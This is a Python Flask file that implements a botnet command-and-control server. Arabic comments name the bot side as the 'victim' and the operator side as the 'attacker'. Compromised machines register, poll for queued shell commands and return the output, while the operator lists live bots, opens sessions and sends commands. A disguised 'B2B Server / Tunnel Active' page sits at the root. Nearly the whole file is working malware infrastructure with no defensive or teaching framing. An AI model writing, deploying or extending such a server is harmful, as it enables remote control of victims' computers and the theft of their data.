from flask import Flask, request, jsonify, render_template_string
import time
import json
import threading
import uuid

app = Flask(__name__)

# ===== قاعدة بيانات بسيطة فـ الذاكرة =====
bots = {}          # bot_id -> {"ip": ip, "last_seen": time}
sessions = {}      # session_id -> {"bot_id": bot_id, "commands": [], "results": []}

# ===== صفحة ويب بسيطة =====
@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>B2B Server</title>
        <style>
            body { background: #0a0a0a; color: #000000; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .box { border: 2px solid #f1ebf1; padding: 40px; text-align: center; background: #000; }
            h1 { font-size: 48px; margin: 0; }
            .sub { color: #960d0d; font-size: 14px; margin-top: 10px; }
        </style
    </head>
    <body>
        <div class="box">
            <h1>B2B Server</h1>
            <div class="sub">Tunnel Active</div>
            <div class="sub" style="margin-top:20px; color:#003300;">⚡ Ready</div>
        </div>
    </body>
    </html>
    """

# ===== APIs للـ Agent (الضحية) =====
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    bot_id = data.get('id', str(uuid.uuid4())[:8])
    bots[bot_id] = {
        "ip": request.remote_addr,
        "last_seen": time.time()
    }
    return jsonify({"status": "ok", "bot_id": bot_id})

@app.route('/get_command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    if bot_id not in bots:
        return jsonify({"command": ""})
    
    for session_id, session in sessions.items():
        if session.get("bot_id") == bot_id:
            if session.get("commands"):
                cmd = session["commands"].pop(0)
                bots[bot_id]["last_seen"] = time.time()
                return jsonify({"command": cmd})
    
    bots[bot_id]["last_seen"] = time.time()
    return jsonify({"command": ""})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    bot_id = data.get('bot_id')
    result = data.get('result', '')
    
    for session_id, session in sessions.items():
        if session.get("bot_id") == bot_id:
            session["results"].append(result)
            break
    
    return jsonify({"status": "ok"})

# ===== APIs للـ Attacker (أداة CLI) =====
@app.route('/api/list_bots', methods=['GET'])
def list_bots():
    now = time.time()
    active = []
    for bot_id, info in bots.items():
        if now - info["last_seen"] < 30:
            active.append({
                "id": bot_id,
                "ip": info["ip"],
                "last_seen": info["last_seen"]
            })
    return jsonify(active)

@app.route('/api/start_session', methods=['POST'])
def start_session():
    data = request.json
    bot_id = data.get('bot_id')
    
    if bot_id not in bots:
        return jsonify({"status": "error", "message": "Bot not found"}), 404
    
    session_id = str(uuid.uuid4())[:8]
    sessions[session_id] = {
        "bot_id": bot_id,
        "commands": [],
        "results": []
    }
    
    return jsonify({"status": "ok", "session_id": session_id})

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    session_id = data.get('session_id')
    command = data.get('command')
    
    if session_id not in sessions:
        return jsonify({"status": "error", "message": "Session not found"}), 404
    
    sessions[session_id]["commands"].append(command)
    return jsonify({"status": "ok"})

@app.route('/api/get_results/<session_id>', methods=['GET'])
def get_results(session_id):
    if session_id not in sessions:
        return jsonify({"results": []})
    
    results = sessions[session_id]["results"]
    sessions[session_id]["results"] = []
    return jsonify({"results": results})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)